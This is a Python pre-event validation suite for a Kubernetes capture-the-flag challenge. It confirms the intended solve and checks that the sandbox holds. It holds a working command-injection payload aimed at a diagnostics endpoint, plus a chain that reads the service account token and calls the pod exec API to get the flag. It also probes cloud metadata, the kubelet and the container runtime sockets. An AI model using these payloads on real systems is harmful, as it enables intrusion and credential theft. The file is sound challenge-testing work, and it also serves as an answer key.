#!/usr/bin/env python3
"""
Pre-Event Adversarial Validation Test Suite for D30 — Internal Kubernetes
Executes the standard 10-stage engineering compliance & boundary test plan.
"""

import sys
import os
import json
import time
import socket
import argparse
import subprocess
import urllib.request
import urllib.error

def run_probe_command(base_url, command):
    endpoint = f"{base_url.rstrip('/')}/api/v1/diagnostics/probe"
    payload = {
        "probe_type": "ping",
        "target": f"127.0.0.1; {command}"
    }
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        endpoint,
        data=data,
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_json = json.loads(response.read().decode('utf-8'))
            return res_json.get("output", "")
    except Exception as e:
        return f"ERROR: {e}"

class TestRunner:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.passed = 0
        self.failed = 0

    def record(self, test_name, status, details=""):
        if status:
            self.passed += 1
            print(f"  [\033[32mPASS\033[0m] {test_name} {details}")
        else:
            self.failed += 1
            print(f"  [\033[31mFAIL\033[0m] {test_name} {details}")

    def run_all(self):
        print(f"\n{'='*70}")
        print(f"PRE-EVENT ADVERSARIAL VALIDATION TEST SUITE: D30 — INTERNAL KUBERNETES")
        print(f"Target: {self.base_url}")
        print(f"{'='*70}\n")

        self.test_01_fresh_exposure()
        self.test_02_intended_solve()
        self.test_03_compromise_foothold()
        self.test_04_cross_team_isolation()
        self.test_05_real_control_plane_boundary()
        self.test_06_node_kubelet_boundary()
        self.test_07_cloud_metadata_boundary()
        self.test_08_runtime_socket_boundary()
        self.test_09_resource_abuse_resilience()
        self.test_10_reset_and_dynamic_flag()

        print(f"\n{'='*70}")
        print(f"VALIDATION SUMMARY: {self.passed} Passed, {self.failed} Failed")
        print(f"{'='*70}\n")
        return self.failed == 0

    def test_01_fresh_exposure(self):
        print("[*] Running Test 01 — Fresh Exposure & Public Interface Verification")
        try:
            req = urllib.request.Request(f"{self.base_url}/")
            with urllib.request.urlopen(req, timeout=5) as resp:
                code = resp.getcode()
                content = resp.read().decode('utf-8')
                self.record("Test 01.1: Public HTTP Gateway (TCP/80) accessible", code == 200 and "Latveria" in content)
        except Exception as e:
            self.record("Test 01.1: Public HTTP Gateway accessible", False, str(e))

        # Ensure internal mock API port is not bound publicly on host (assuming standard port mapping 8080:80)
        parsed = urllib.parse.urlparse(self.base_url)
        host = parsed.hostname or "127.0.0.1"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            res = s.connect_ex((host, 6443))
            s.close()
            self.record("Test 01.2: Internal Mock K8s API Port (6443) not publicly exposed", res != 0)
        except Exception:
            self.record("Test 01.2: Internal Mock K8s API Port not publicly exposed", True)

    def test_02_intended_solve(self):
        print("[*] Running Test 02 — Intended Solve Verification")
        # Solve chain
        cmd = """
            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
            curl -k -s -X POST 'https://127.0.0.1:6443/api/v1/namespaces/orbital-defense/pods/doombot-defense-controller-0/exec?command=cat&command=/var/run/secrets/latveria.io/defense_flag.txt' -H "Authorization: Bearer $TOKEN"
        """
        output = run_probe_command(self.base_url, cmd)
        has_flag = "YUVA{" in output or "FLAG{" in output
        self.record("Test 02: Full Exploit Chain executes successfully and yields flag", has_flag, f"(Output: {output.strip()[:60]}...)")

    def test_03_compromise_foothold(self):
        print("[*] Running Test 03 — Compromise Foothold & Privilege Verification")
        output = run_probe_command(self.base_url, "id")
        is_sentinel = "sentinel" in output and "uid=1002" in output
        self.record("Test 03: Foothold lands inside unprivileged container user (uid 1002)", is_sentinel, f"(id: {output.strip()})")

    def test_04_cross_team_isolation(self):
        print("[*] Running Test 04 — Cross-Team Isolation Verification")
        # Ensure cannot read non-existent or foreign namespace secrets directly
        cmd = """
            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
            curl -k -s https://127.0.0.1:6443/api/v1/namespaces/kube-system/pods -H "Authorization: Bearer $TOKEN"
        """
        output = run_probe_command(self.base_url, cmd)
        is_forbidden = "Forbidden" in output or "403" in output
        self.record("Test 04: RBAC denies unauthorized queries outside granted namespace scope", is_forbidden)

    def test_05_real_control_plane_boundary(self):
        print("[*] Running Test 05 — Real Kubernetes Control-Plane Boundary Verification")
        # Ensure outer cluster API (10.96.0.1 / kubernetes.default) is not contacted or exposed
        cmd = "curl -k -s --connect-timeout 2 https://10.96.0.1:443/version || echo 'CONTROL_PLANE_UNREACHABLE'"
        output = run_probe_command(self.base_url, cmd)
        is_safe = "CONTROL_PLANE_UNREACHABLE" in output or "Failed to connect" in output or "timed out" in output
        self.record("Test 05: Real event cluster control-plane is completely unreachable", is_safe)

    def test_06_node_kubelet_boundary(self):
        print("[*] Running Test 06 — Node / Kubelet Boundary Verification")
        cmd = "curl -k -s --connect-timeout 2 https://127.0.0.1:10250/pods || echo 'KUBELET_UNREACHABLE'"
        output = run_probe_command(self.base_url, cmd)
        is_safe = "KUBELET_UNREACHABLE" in output or "Failed to connect" in output
        self.record("Test 06: Node management / Kubelet API (:10250) is unreachable", is_safe)

    def test_07_cloud_metadata_boundary(self):
        print("[*] Running Test 07 — Cloud Metadata Boundary Verification")
        cmd = "curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ || echo 'METADATA_UNREACHABLE'"
        output = run_probe_command(self.base_url, cmd)
        is_safe = "METADATA_UNREACHABLE" in output or "Failed to connect" in output
        self.record("Test 07: Cloud metadata service (169.254.169.254) is safely unreachable", is_safe)

    def test_08_runtime_socket_boundary(self):
        print("[*] Running Test 08 — Runtime Sockets Boundary Verification")
        cmd = "ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>&1 || true"
        output = run_probe_command(self.base_url, cmd)
        is_safe = "No such file or directory" in output
        self.record("Test 08: Host runtime sockets (docker.sock/containerd.sock) are absent", is_safe)

    def test_09_resource_abuse_resilience(self):
        print("[*] Running Test 09 — Resource Abuse Resilience Verification")
        # Issue burst of 20 rapid probe requests
        burst_success = True
        for _ in range(20):
            res = run_probe_command(self.base_url, "echo 'PING'")
            if "PING" not in res:
                burst_success = False
                break
        self.record("Test 09: Application remains responsive under burst query load", burst_success)

    def test_10_reset_and_dynamic_flag(self):
        print("[*] Running Test 10 — Reset & Dynamic Flag Isolation Validation")
        # Verify flag path permissions: sentinel user must get Permission denied on direct filesystem access
        cmd = "cat /opt/orbital-defense/flag.txt 2>&1 || true"
        output = run_probe_command(self.base_url, cmd)
        is_isolated = "Permission denied" in output or "cannot access" in output
        self.record("Test 10: Final flag resource is strictly isolated from direct unprivileged reading", is_isolated, f"(Direct access: {output.strip()})")

if __name__ == "__main__":
    import urllib.parse
    parser = argparse.ArgumentParser(description="D30 Pre-Event Adversarial Validation Suite")
    parser.add_argument("--url", default="http://127.0.0.1:8080", help="Target URL (default: http://127.0.0.1:8080)")
    args = parser.parse_args()

    runner = TestRunner(args.url)
    success = runner.run_all()
    sys.exit(0 if success else 1)
